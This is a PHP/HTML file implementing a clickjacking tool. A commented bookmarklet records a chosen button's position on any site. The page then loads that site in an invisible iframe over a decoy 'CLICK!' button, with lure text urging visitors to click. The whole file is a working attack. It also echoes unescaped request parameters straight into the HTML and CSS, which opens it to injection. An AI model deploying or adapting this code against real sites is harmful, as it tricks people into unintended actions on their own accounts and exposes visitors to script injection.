<?php
  $config = explode(",",$_REQUEST['q']);
  $url = $config[0];
  $width = $config[1];
  $height = $config[2];
  $top = $config[3];
  $left = $config[4];
  $btn_width = $config[5];
  $btn_height = $config[6];
/*
var s=document.createElement('script');
s.setAttribute('src','http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js');
document.body.appendChild(s);(function(){if(window.jQuery){
alert("Click on the link/button you want to clickjack. You will be redirected to the page to click people.")
jQuery("*").click(function(){var w=jQuery(window),t=jQuery(this),p=t.position();
location='http://www.antimatter15.com/misc/clickjack.php?q='+([location.href,
parseInt(w.width()),parseInt(w.height()),parseInt(p.top),
parseInt(p.left),parseInt(t.width()),parseInt(t.height())]);return false})
}else{setTimeout(arguments.callee,1000);}})();
*/
?>
<html><head>	
<title>Click!</title>
<style>
iframe {
	position: absolute;
	width: <?php echo $width;?>px;
	height: <?php echo $height;?>px;
	top: -<?php echo $top;?>px;
	left: -<?php echo $left;?>px;
	z-index: 2;
	opacity: 0;
	filter: alpha(opacity=0);
}
button {
	position: absolute;
	top: 0px;
	left: 0px;
	z-index: 1;
	width: <?php echo $btn_width;?>px;
	height: <?php echo $btn_height;?>px;
}
div {
  position: absolute;
  left: 200px;
  top: 200px;
  width: 100px;
  height: 50px;
  overflow: hidden;
}
</style>
<script>
var count = 0;
function clicked(ifr){
  if(count++ > 0){
    setTimeout(function(){
      document.getElementsByTagName("button")[0].style.display = "none";
      alert('OMG U R HAZ PWND')
    },1000)
  }
}
</script>
</head><body>
<div>
<iframe src="<?php echo $url;?>" scrolling="no" onload="clicked(this)"></iframe>
<button>CLICK!</button>
</div>		
OMG THE COOLIEST THING EVAH! JUST CLICK THAT FRIGGIN BUTTON! IT'S AMAZING!
</body>	
</html>